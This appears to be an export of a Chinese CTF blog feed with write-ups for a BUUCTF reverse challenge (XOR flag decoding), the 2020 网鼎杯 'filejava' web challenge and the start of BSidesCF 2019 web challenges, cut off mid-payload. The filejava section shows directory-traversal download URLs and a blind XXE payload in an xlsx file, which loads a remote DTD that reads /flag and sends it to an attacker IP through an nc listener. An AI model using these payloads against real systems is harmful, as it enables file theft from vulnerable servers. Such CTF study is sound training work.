number">0x21uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>LABEL_13<span class="token operator">:</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Failed"</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>提取global字符串的数据<br><img src="/2020/11/13/BUUCTF%E4%B9%8BReverse/3.png" alt><br>解flag脚本，这里提供两个，第一个为直接复制的global，所以得转换一下数据类型；第二个为提取的十六进制，直接就可以转换。<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">str1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'@'</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token string">'Z'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span>        <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">]</span>x <span class="token operator">=</span> <span class="token string">'f'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">isinstance</span><span class="token punctuation">(</span>str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                          <span class="token comment">#这里的这些判断是为了判断上面的list里的是否为数字。其中0X0A与6类似的为数字，带''的为str。</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">isinstance</span><span class="token punctuation">(</span>str1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            x <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>str1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            x <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> str1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        x <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>str1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">a0x0 <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token number">102</span><span class="token punctuation">,</span>  <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span>  <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span>  <span class="token number">38</span><span class="token punctuation">,</span>  <span class="token number">79</span><span class="token punctuation">,</span>  <span class="token number">46</span><span class="token punctuation">,</span>  <span class="token number">64</span><span class="token punctuation">,</span>  <span class="token number">17</span><span class="token punctuation">,</span>   <span class="token number">120</span><span class="token punctuation">,</span>  <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">90</span><span class="token punctuation">,</span>  <span class="token number">59</span><span class="token punctuation">,</span>  <span class="token number">85</span><span class="token punctuation">,</span>  <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span>  <span class="token number">25</span><span class="token punctuation">,</span>  <span class="token number">70</span><span class="token punctuation">,</span>  <span class="token number">31</span><span class="token punctuation">,</span>   <span class="token number">118</span><span class="token punctuation">,</span>  <span class="token number">34</span><span class="token punctuation">,</span>  <span class="token number">77</span><span class="token punctuation">,</span>  <span class="token number">35</span><span class="token punctuation">,</span>  <span class="token number">68</span><span class="token punctuation">,</span>  <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span>   <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span>  <span class="token number">15</span><span class="token punctuation">,</span>   <span class="token number">71</span><span class="token punctuation">,</span>  <span class="token number">50</span><span class="token punctuation">,</span>  <span class="token number">79</span><span class="token punctuation">]</span>   <span class="token comment">#保留前三十三个字符的ascii</span>flag <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>a0x0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#第一位不进行异或</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>a0x0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>a0x0<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> a0x0<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#逐位异或</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><img src="/2020/11/13/BUUCTF%E4%B9%8BReverse/2.png" alt></p><p><strong>capture the flag</strong><br><code>flag&#123;QianQiuWanDai_YiTongJiangHu&#125;</code></p><h1 id><a href="#" class="headerlink" title="#"></a>#</h1>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯_2020_青龙组_web部分</title>
      <link href="2020/11/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-web%E9%83%A8%E5%88%86/"/>
      <url>2020/11/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-web%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-filejava"><a href="#1-filejava" class="headerlink" title="1.filejava"></a>1.filejava</h1><p><strong>Tag:web-xml文件泄露，blind xxe，java反汇编，未解</strong></p><p>打开界面首先出现的就是一个可以上传文件的界面，我上传了一张图片，然后出现了一个上传成功的样式，并且可以将上传的图片下载下来，bp抓一下包。<br><img src="/2020/11/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-web%E9%83%A8%E5%88%86/1.png" alt="可以下载"><br>首先用bp的repeater模块没有发现啥东西<br><img src="/2020/11/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-web%E9%83%A8%E5%88%86/2.png" alt="没啥东西"><br>然后将参数改为<code>filename=../</code>测试一下目录穿越，结果报错了，也爆出了<code>web.xml</code>文件的绝对路径，下面看图<br><img src="/2020/11/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-web%E9%83%A8%E5%88%86/3.png" alt="爆出web-inf"><br><pre class="line-numbers language-none"><code class="language-none">异常报告&lt;&#x2F;p&gt;&lt;p&gt;&lt;b&gt;消息&lt;&#x2F;b&gt; &amp;#47;usr&amp;#47;local&amp;#47;tomcat&amp;#47;webapps&amp;#47;ROOT&amp;#47;WEB-INF&amp;#47;upload&amp;#47;15&amp;#47;6&amp;#47;.. (Is a directory)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>用<a href="https://c.runoob.com/front-end/691">菜鸟工具</a>解一下unicode编码后为<br><pre class="line-numbers language-none"><code class="language-none">异常报告消息 &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;upload&#x2F;15&#x2F;6&#x2F;.. (Is a directory)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>然后尝试下载<code>web.xml</code>文件如下<br><img src="/2020/11/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-web%E9%83%A8%E5%88%86/4.png" alt></p><p>下面是几个.class文件的相对路径<br><pre class="line-numbers language-none"><code class="language-none">&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;ListFileServlet.class&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;DownloadServlet.class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>直接把这几个文件下载下来。<br>访问<br><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ff202493-3329-4158-951d-39b0a82943b9.node3.buuoj.cn&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;ListFileServlet.classhttp:&#x2F;&#x2F;ff202493-3329-4158-951d-39b0a82943b9.node3.buuoj.cn&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.classhttp:&#x2F;&#x2F;ff202493-3329-4158-951d-39b0a82943b9.node3.buuoj.cn&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;DownloadServlet.class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><code>cn.abc.servlet.UploadServlet</code>文件好像有点问题。<br><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> savePath <span class="token operator">=</span> <span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token string">"/WEB-INF/upload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> tempPath <span class="token operator">=</span> <span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token string">"/WEB-INF/temp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">File</span> tempFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>tempPath<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tempFile<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      tempFile<span class="token punctuation">.</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token class-name">String</span> message <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">DiskFileItemFactory</span> factory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DiskFileItemFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      factory<span class="token punctuation">.</span><span class="token function">setSizeThreshold</span><span class="token punctuation">(</span><span class="token number">102400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      factory<span class="token punctuation">.</span><span class="token function">setRepository</span><span class="token punctuation">(</span>tempFile<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">ServletFileUpload</span> upload <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServletFileUpload</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">FileItemFactory</span><span class="token punctuation">)</span>factory<span class="token punctuation">)</span><span class="token punctuation">;</span>      upload<span class="token punctuation">.</span><span class="token function">setHeaderEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      upload<span class="token punctuation">.</span><span class="token function">setFileSizeMax</span><span class="token punctuation">(</span><span class="token number">1048576L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      upload<span class="token punctuation">.</span><span class="token function">setSizeMax</span><span class="token punctuation">(</span><span class="token number">10485760L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">ServletFileUpload</span><span class="token punctuation">.</span><span class="token function">isMultipartContent</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>       <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">FileItem</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> upload<span class="token punctuation">.</span><span class="token function">parseRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">FileItem</span> fileItem <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileItem<span class="token punctuation">.</span><span class="token function">isFormField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">String</span> name <span class="token operator">=</span> fileItem<span class="token punctuation">.</span><span class="token function">getFieldName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">String</span> str <span class="token operator">=</span> fileItem<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         <span class="token class-name">String</span> filename <span class="token operator">=</span> fileItem<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>filename <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> filename<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>         <span class="token class-name">String</span> fileExtName <span class="token operator">=</span> filename<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>filename<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InputStream</span> in <span class="token operator">=</span> fileItem<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>filename<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"excel-"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string">"xlsx"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>fileExtName<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Workbook</span> wb1 <span class="token operator">=</span> <span class="token class-name">WorkbookFactory</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Sheet</span> sheet <span class="token operator">=</span> wb1<span class="token punctuation">.</span><span class="token function">getSheetAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sheet<span class="token punctuation">.</span><span class="token function">getFirstRowNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvalidFormatException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"poi-ooxml-3.10 has something wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token class-name">String</span> saveFilename <span class="token operator">=</span> <span class="token function">makeFileName</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>        request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"saveFilename"</span><span class="token punctuation">,</span> saveFilename<span class="token punctuation">)</span><span class="token punctuation">;</span>        request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"filename"</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> realSavePath <span class="token operator">=</span> <span class="token function">makePath</span><span class="token punctuation">(</span>saveFilename<span class="token punctuation">,</span> savePath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">FileOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>realSavePath <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> saveFilename<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>          out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>         in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        message <span class="token operator">=</span> <span class="token string">"文件上传成功"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">FileUploadException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> message<span class="token punctuation">)</span><span class="token punctuation">;</span>    request<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span><span class="token string">"/ListFileServlet"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span><span class="token punctuation">)</span>request<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">ServletResponse</span><span class="token punctuation">)</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>这里有个<code>excel</code>单词，涉及了下面的<a href="https://www.jianshu.com/p/73cd11d83c30">CVE-2014-3529</a>没有对xxe进行防护。</p><p><strong>漏洞利用</strong></p><p><strong>受害端文件构造</strong></p><p>首先新建文件<code>excel-</code>开头的文件，这里我的文件名为<code>excel-1.xlsx</code><br><img src="/2020/11/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-web%E9%83%A8%E5%88%86/5.png" alt></p><blockquote><p>~这里因为听说buu的靶机都可以访问外网了，所以这里直接可以拿我的服务器做一下测试。~屁勒，不能，还是开个主机吧，<code>172.16.167.234</code>是靶机的内网ip<code>ifconfig</code></p></blockquote><p>然后把后缀名改为.zip后，改文件<code>[Content_Types].xml</code>的内容，向其中从第二行添加内容如下<br><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">convert</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY % remote SYSTEM "http://172.16.168.38/file.dtd">%remote;%int;%send;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>改后将文件名重新再次命名为<code>excel-1.xlsx</code></p><p><strong>攻击端文件构造</strong></p><p>然后在攻击机的<code>/var/www/html/</code>下面新建<code>file.dtd</code>文件，内容如下<br><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///flag">&lt;!ENTITY % int "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://172.16.168.38:1111?p=%file;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><p><strong>反弹shell</strong></p><p>然后在攻击机端执行命令<br><pre class="line-numbers language-none"><code class="language-none">nc -lvvp 1111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>对反弹的流量进行监听</p><p><strong>flag</strong><br>然后上传<code>excel-1.xlsx</code>文件，在攻击机端接收到<code>flag</code></p><p><strong>按理说应该也可以的，但是没成功监听。。。好家伙，白忙活了，有时间再回来重做⑧</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BSidesCF-2019-web部分</title>
      <link href="2020/11/12/BSidesCF-2019/"/>
      <url>2020/11/12/BSidesCF-2019/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p><font color="blue" size="1">我也想说对不起，可不知该从何谈起。</font></p><p>也是一个怀揣梦想的少年</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=1377372171&auto=1&height=66"></iframe><p><strong><em>从这次开始按比赛刷题</em></strong></p><h1 id="1-Pick-Tac-Toe"><a href="#1-Pick-Tac-Toe" class="headerlink" title="1.Pick Tac Toe"></a>1.Pick Tac Toe</h1><p><strong>标签:hackbar</strong></p><p>人机对战，这个很简单，hackbar实现三点连线获得游戏胜利的同时就也能获得flag了。发现能覆盖机器人的棋子位置，直接可以把所有的机器人的位置覆盖，当然这里我们只需要三点连线应该就行了。<br><img src="/2020/11/12/BSidesCF-2019/1.png" alt><br>直接获得flag。<br><code>flag&#123;5d693414-b66f-4cd4-a83e-096b92a2b2e7&#125;</code></p><h1 id="2-SVGMagic"><a href="#2-SVGMagic" class="headerlink" title="2.SVGMagic"></a>2.SVGMagic</h1><p><strong>标签:文件上传，xxe，svg</strong></p><p><a href="https://tiaonmmn.github.io/2020/09/03/BUUOJ%E5%88%B7%E9%A2%98-Web-SVGMagic/">参考题解</a></p><blockquote><p>svg实际上是一种xml文档，所以这里应该可以xxe<br><img src="/2020/11/12/BSidesCF-2019/0.png" alt><br>又根据svg的<code>&lt;text&gt;</code>标签可以成功执行xxe。<br><img src="/2020/11/12/BSidesCF-2019/2.png" alt><br><a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Element/text">svg之text标签</a></p></blockquote><h2 id="0x01-payload"><a href="#0x01-payload" class="headerlink" title="0x01.payload"></a>0x01.payload</h2><p>用下面的payload，上传文件内容如下<br><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> 